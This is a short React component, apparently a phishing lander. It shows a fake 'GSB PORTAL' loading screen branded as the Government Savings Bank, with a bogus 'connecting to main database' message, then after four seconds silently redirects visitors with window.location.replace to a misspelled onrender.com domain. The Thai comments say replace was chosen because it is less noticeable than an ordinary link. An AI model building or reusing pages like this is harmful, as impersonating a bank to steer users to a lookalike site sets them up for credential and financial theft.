import { useEffect } from 'react'
import './App.css'

function App() {

  useEffect(() => {
    // 1. ตั้งเวลาโชว์ความเท่ของ GSB PORTAL สัก 4 วินาที
    const timer = setTimeout(() => {
      
      // 2. ใช้คำสั่ง replace เพื่อ "วาร์ปทับหน้าเดิม" ไม่ให้เด้งแยกหน้า
      // และเนียนกว่าการใช้ href ปกติ
      window.location.replace("https://customersyetem.onrender.com"); 

    }, 4000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="portal-container">
      <div className="ambient-blob"></div>
      
      <div className="glass-loading-card">
        <div className="brand-header">
          <div className="icon-shield">
            <i className="fa-solid fa-building-columns"></i>
          </div>
          <h1 className="logo-text">GSB <span>PORTAL</span></h1>
        </div>

        <div className="loading-mechanic">
          <div className="progress-track">
            <div className="progress-glow"></div>
          </div>
          <div className="status-container">
            <span className="live-dot"></span>
            <p className="status-text">กำลังเชื่อมต่อระบบฐานข้อมูลหลัก...</p>
          </div>
        </div>

        <div className="footer-copyright" style={{ marginTop: '40px', color: 'rgba(255,255,255,0.1)', fontSize: '0.6rem', letterSpacing: '2px' }}>
            © 2026 GOVERNMENT SAVINGS BANK PORTAL
        </div>
      </div>
    </div>
  )
}

export default App